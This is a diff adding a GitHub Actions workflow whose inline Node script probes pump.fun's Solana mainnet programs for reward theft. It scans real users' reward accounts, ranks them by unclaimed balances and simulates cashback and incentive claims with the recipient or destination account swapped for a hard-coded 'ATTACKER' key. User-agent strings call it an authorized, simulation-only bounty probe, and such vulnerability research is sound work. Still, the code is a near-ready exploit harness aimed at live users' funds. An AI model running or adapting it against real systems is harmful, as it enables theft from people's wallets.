@@ -1,0 +1,90 @@
+name: claim-rewards-positive-runtime
+on:
+  push:
+    paths:
+      - '.github/workflows/claim-rewards-positive-runtime.yml'
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-sdk@1.36.0 @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token bs58 bn.js
+      - name: Read-only positive reward scan and simulation-only claim differentials
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import bs58pkg from 'bs58'; const bs58=bs58pkg.default??bs58pkg;
+          import {Connection,PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {NATIVE_MINT,TOKEN_PROGRAM_ID,TOKEN_2022_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync,AccountLayout} from '@solana/spl-token';
+          import * as pump from '@pump-fun/pump-sdk';
+          import * as amm from '@pump-fun/pump-swap-sdk';
+
+          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com'];
+          const MAIN=RPCS[0], connection=new Connection(MAIN,'confirmed');
+          const ATTACKER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const USER_ACC_DISC=Buffer.from('56ff700e66359afa','hex');
+          let id=1;const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function one(url,method,params,n=3){let last;for(let a=0;a<n;a++){try{const r=await fetch(url,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-readonly-reward-scan/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});if(r.status===429||r.status>=500){last=Error('HTTP '+r.status);await sleep(450+650*a);continue}if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}catch(e){last=e;await sleep(350+500*a)}}throw last}
+          async function rpc(method,params){let last;for(const u of RPCS){try{return await one(u,method,params,3)}catch(e){last=e;console.log('RPC_FAIL',method,u,String(e).slice(0,180))}}throw last}
+          function parseUva(pk,b){return {account:pk,user:bs58.encode(b.subarray(8,40)),needsClaim:b[40]!==0,totalUnclaimed:b.readBigUInt64LE(41).toString(),totalClaimed:b.readBigUInt64LE(49).toString(),currentSolVolume:b.readBigUInt64LE(57).toString(),lastUpdate:b.readBigInt64LE(65).toString(),hasTotalClaimed:b[73]!==0,cashbackEarned:b.readBigUInt64LE(74).toString(),totalCashbackClaimed:b.readBigUInt64LE(82).toString()}}
+          function cashbackPending(x){const a=BigInt(x.cashbackEarned),b=BigInt(x.totalCashbackClaimed);return a>b?a-b:0n}
+          async function scanProgram(label,programId){let rows;try{rows=await rpc('getProgramAccounts',[programId.toBase58(),{encoding:'base64',commitment:'confirmed',filters:[{dataSize:90},{memcmp:{offset:0,bytes:bs58.encode(USER_ACC_DISC)}}]}])}catch(e){console.log('GPA_ALL_FAIL',label,String(e));return []}const out=[];for(const r of rows){const b=Buffer.from(r.account.data[0],'base64');if(b.length!==90||!b.subarray(0,8).equals(USER_ACC_DISC))continue;out.push(parseUva(r.pubkey,b))}out.sort((a,b)=>{const A=cashbackPending(a)+BigInt(a.totalUnclaimed),B=cashbackPending(b)+BigInt(b.totalUnclaimed);return A>B?-1:A<B?1:0});console.log('\nSCAN_SUMMARY',label,JSON.stringify({count:out.length,cashbackPositive:out.filter(x=>cashbackPending(x)>0n).length,tokenPositive:out.filter(x=>BigInt(x.totalUnclaimed)>0n).length,needsClaim:out.filter(x=>x.needsClaim).length},null,2));for(const x of out.slice(0,40))console.log('RANKED',label,JSON.stringify({...x,cashbackPending:cashbackPending(x).toString(),combined:(cashbackPending(x)+BigInt(x.totalUnclaimed)).toString()}));return out}
+          const pumpRows=await scanProgram('pump',pump.PUMP_PROGRAM_ID), ammRows=await scanProgram('amm',amm.PUMP_AMM_PROGRAM_ID);
+
+          function tokenAmountFromInfo(ai){if(!ai?.data||ai.data.length<165)return null;try{return AccountLayout.decode(ai.data).amount.toString()}catch{return null}}
+          function parseLogs(logs){const t=(logs??[]).join('\n');return {account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|Transfer|cashback|incentive|claim|failed|success/i.test(x)).slice(-120)}}
+          async function simulate(label,programId,ixs,watch=[]){const {blockhash}=await connection.getLatestBlockhash('processed');const tx=new VersionedTransaction(new TransactionMessage({payerKey:ATTACKER,recentBlockhash:blockhash,instructions:ixs}).compileToV0Message());const raw=Buffer.from(tx.serialize()).toString('base64');const cfg={encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'};if(watch.length)cfg.accounts={encoding:'base64',addresses:watch.map(x=>x.toBase58())};const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,cfg]};const r=await fetch(MAIN,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-reward-claim/1.0'},body:JSON.stringify(body)});const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));const v=j.result.value,e=parseLogs(v.logs);const watched=(v.accounts??[]).map((a,i)=>({pk:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,lamports:a?.lamports??null,dataLen:a?.data?.[0]?Buffer.from(a.data[0],'base64').length:null,tokenAmount:a?.data?.[0]?tokenAmountFromInfo({data:Buffer.from(a.data[0],'base64')}):null}));console.log('\nSIM',label,JSON.stringify({program:programId.toBase58(),err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,watched,interesting:e.interesting},null,2));return {v,e,watched}}
+          function mutateIx(ix,index,pk){const keys=ix.keys.map(k=>({...k}));keys[index]={...keys[index],pubkey:pk};return new TransactionInstruction({programId:ix.programId,keys,data:Buffer.from(ix.data)})}
+
+          // PUMP SOL cashback: canonical claim is permissionless but must only pay the UVA-bound user.
+          const pumpCash=pumpRows.find(x=>cashbackPending(x)>0n);
+          if(pumpCash){
+            const user=new PublicKey(pumpCash.user),uva=new PublicKey(pumpCash.account);console.log('\nPUMP_CASH_TARGET',JSON.stringify({...pumpCash,cashbackPending:cashbackPending(pumpCash).toString()}));
+            const prog=pump.getPumpProgram(connection);
+            try{
+              const ix=await prog.methods.claimCashback().accountsPartial({user,userVolumeAccumulator:uva}).instruction();
+              console.log('PUMP_CASH_IX',JSON.stringify(ix.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+              await simulate('pump_cashback_control',pump.PUMP_PROGRAM_ID,[ix],[user,uva]);
+              const ui=ix.keys.findIndex(k=>k.pubkey.equals(user)),vi=ix.keys.findIndex(k=>k.pubkey.equals(uva));
+              if(ui>=0)await simulate('pump_cashback_user_to_attacker_keep_victim_uva',pump.PUMP_PROGRAM_ID,[mutateIx(ix,ui,ATTACKER)],[user,ATTACKER,uva]);
+              const other=pumpRows.find(x=>x.account!==pumpCash.account);if(vi>=0&&other)await simulate('pump_cashback_other_valid_uva_keep_victim_user',pump.PUMP_PROGRAM_ID,[mutateIx(ix,vi,new PublicKey(other.account))],[user,uva,new PublicKey(other.account)]);
+            }catch(e){console.log('PUMP_CASH_BUILD_FAIL',String(e).slice(0,1200))}
+          } else console.log('NO_POSITIVE_PUMP_CASHBACK');
+
+          // AMM cashback uses token accounts; start with WSOL because the legacy account names are explicitly WSOL-oriented.
+          const ammCash=ammRows.find(x=>cashbackPending(x)>0n);
+          if(ammCash){
+            const user=new PublicKey(ammCash.user),uva=new PublicKey(ammCash.account),prog=amm.getPumpAmmProgram(connection);
+            console.log('\nAMM_CASH_TARGET',JSON.stringify({...ammCash,cashbackPending:cashbackPending(ammCash).toString()}));
+            for(const [method,mint,tp] of [['claimCashback',NATIVE_MINT,TOKEN_PROGRAM_ID],['claimCashbackV2',NATIVE_MINT,TOKEN_PROGRAM_ID]]){
+              try{
+                const mb=prog.methods[method]();const ix=await mb.accountsPartial({user,userVolumeAccumulator:uva,quoteMint:mint,quoteTokenProgram:tp}).instruction();
+                console.log('AMM_CASH_IX',method,JSON.stringify(ix.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+                const userAta=getAssociatedTokenAddressSync(mint,user,true,tp,ASSOCIATED_TOKEN_PROGRAM_ID),uvaAta=getAssociatedTokenAddressSync(mint,uva,true,tp,ASSOCIATED_TOKEN_PROGRAM_ID),attackerAta=getAssociatedTokenAddressSync(mint,ATTACKER,true,tp,ASSOCIATED_TOKEN_PROGRAM_ID);
+                await simulate('amm_'+method+'_control',amm.PUMP_AMM_PROGRAM_ID,[ix],[user,uva,userAta,uvaAta,attackerAta]);
+                const ui=ix.keys.findIndex(k=>k.pubkey.equals(user));if(ui>=0)await simulate('amm_'+method+'_user_to_attacker_keep_victim_uva',amm.PUMP_AMM_PROGRAM_ID,[mutateIx(ix,ui,ATTACKER)],[user,ATTACKER,uva,userAta,attackerAta,uvaAta]);
+                const dst=ix.keys.findIndex(k=>k.pubkey.equals(userAta));if(dst>=0)await simulate('amm_'+method+'_destination_to_attacker_ata',amm.PUMP_AMM_PROGRAM_ID,[mutateIx(ix,dst,attackerAta)],[user,uva,userAta,attackerAta,uvaAta]);
+              }catch(e){console.log('AMM_CASH_BUILD_FAIL',method,String(e).slice(0,1200))}
+            }
+          } else console.log('NO_POSITIVE_AMM_CASHBACK');
+
+          // Token incentives: public payer is expected, but payout destination must remain the victim's ATA.
+          for(const [tag,rows,Online,programId] of [['pump',pumpRows,pump.OnlinePumpSdk,pump.PUMP_PROGRAM_ID],['amm',ammRows,amm.OnlinePumpAmmSdk,amm.PUMP_AMM_PROGRAM_ID]]){
+            const target=rows.find(x=>BigInt(x.totalUnclaimed)>0n||x.needsClaim);if(!target){console.log('NO_INCENTIVE_TARGET',tag);continue}
+            const user=new PublicKey(target.user),uva=new PublicKey(target.account);console.log('\nINCENTIVE_TARGET',tag,JSON.stringify(target));
+            try{
+              const online=new Online(connection);const ixs=await online.claimTokenIncentives(user,ATTACKER);console.log('INCENTIVE_BUILD',tag,'ixs',ixs.length);if(!ixs.length)continue;const ix=ixs.at(-1);console.log('INCENTIVE_IX_KEYS',tag,JSON.stringify(ix.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+              const userIndex=ix.keys.findIndex(k=>k.pubkey.equals(user));const uvaIndex=ix.keys.findIndex(k=>k.pubkey.equals(uva));
+              const likelyDst=ix.keys.findIndex(k=>k.isWritable&&!k.isSigner&&k.pubkey.toBase58()!==uva.toBase58());
+              const watch=[user,uva];if(likelyDst>=0)watch.push(ix.keys[likelyDst].pubkey);
+              await simulate(tag+'_incentive_control',programId,ixs,watch);
+              if(userIndex>=0){const list=ixs.slice();list[list.length-1]=mutateIx(ix,userIndex,ATTACKER);await simulate(tag+'_incentive_user_to_attacker_keep_victim_uva',programId,list,watch)}
+              if(likelyDst>=0){let mint=null,tp=null;for(const k of ix.keys){const ai=await connection.getAccountInfo(k.pubkey,'confirmed').catch(()=>null);if(ai?.owner?.equals?.(TOKEN_2022_PROGRAM_ID)||ai?.owner?.equals?.(TOKEN_PROGRAM_ID)){if(ai.data.length>165){mint=k.pubkey;tp=ai.owner;break}}}if(mint&&tp){const attackerAta=getAssociatedTokenAddressSync(mint,ATTACKER,true,tp,ASSOCIATED_TOKEN_PROGRAM_ID);const list=ixs.slice();list[list.length-1]=mutateIx(ix,likelyDst,attackerAta);await simulate(tag+'_incentive_destination_to_attacker_ata',programId,list,[...watch,attackerAta])}}
+            }catch(e){console.log('INCENTIVE_BUILD_OR_SIM_FAIL',tag,String(e).slice(0,1500))}
+          }
+          NODE
